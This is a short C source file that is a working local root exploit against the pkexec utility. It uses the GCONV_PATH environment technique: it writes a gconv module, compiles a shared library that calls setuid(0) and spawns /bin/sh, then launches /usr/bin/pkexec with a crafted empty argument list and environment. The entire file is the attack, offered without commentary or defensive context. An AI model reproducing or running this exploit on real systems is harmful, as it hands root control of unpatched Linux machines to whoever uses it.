#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *shell = 
  "#include <stdio.h>\n"
  "#include <stdlib.h>\n"
  "#include <unistd.h>\n\n"
  "void gconv() {}\n"
  "void gconv_init() {\n"
  "  setuid(0); setgid(0);\n"
  "  seteuid(0); setegid(0);\n"
  "  system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'x'; /bin/sh\");\n"
  "  exit(0);\n"
  "}";

int main(int argc, char *argv[]) {
  FILE *fp;
  system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./x'; chmod a+x 'GCONV_PATH=./x'");
  system("mkdir -p x; echo 'module UTF-8// X// x 2' > x/gconv-modules");
  fp = fopen("x/x.c", "w");
  fprintf(fp, "%s", shell);
  fclose(fp);
  system("gcc x/x.c -o x/x.so -shared -fPIC");
  char *env[] = { "x", "PATH=GCONV_PATH=.", "CHARSET=X", "SHELL=x", NULL };
  execve("/usr/bin/pkexec", (char*[]){NULL}, env);
}
